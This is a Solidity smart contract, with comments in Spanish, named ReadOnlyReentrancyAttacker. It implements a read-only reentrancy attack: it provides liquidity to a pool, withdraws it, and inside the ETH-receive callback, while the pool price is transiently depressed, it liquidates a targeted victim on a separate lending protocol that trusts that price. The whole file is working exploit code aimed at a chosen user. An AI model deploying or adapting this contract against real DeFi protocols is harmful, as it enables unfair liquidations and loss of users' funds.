// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface ILiquidityPool {
    function addLiquidity() external payable;
    function removeLiquidity(uint256 sharesToBurn) external;
}

interface ILoanManager {
    function liquidate(address user) external;
}

contract ReadOnlyReentrancyAttacker {
    ILiquidityPool public immutable pool;
    ILoanManager public immutable loanManager;
    address public immutable victim;

    uint256 private pendingSharesToBurn;

    constructor(address _pool, address _loanManager, address _victim) {
        pool = ILiquidityPool(_pool);
        loanManager = ILoanManager(_loanManager);
        victim = _victim;
    }

    /// @dev Paso previo obligatorio: hay que ser LP para poder llamar a removeLiquidity().
    function seedLiquidity() external payable {
        pool.addLiquidity{value: msg.value}();
    }

    function attack(uint256 sharesToBurn) external {
        pendingSharesToBurn = sharesToBurn;
        pool.removeLiquidity(sharesToBurn);
        pendingSharesToBurn = 0;
    }

    /// @dev Mientras el precio del pool está transitoriamente deprimido, cruza a
    ///      un protocolo completamente distinto que confía en ese precio.
    receive() external payable {
        if (pendingSharesToBurn != 0) {
            loanManager.liquidate(victim);
        }
    }
}
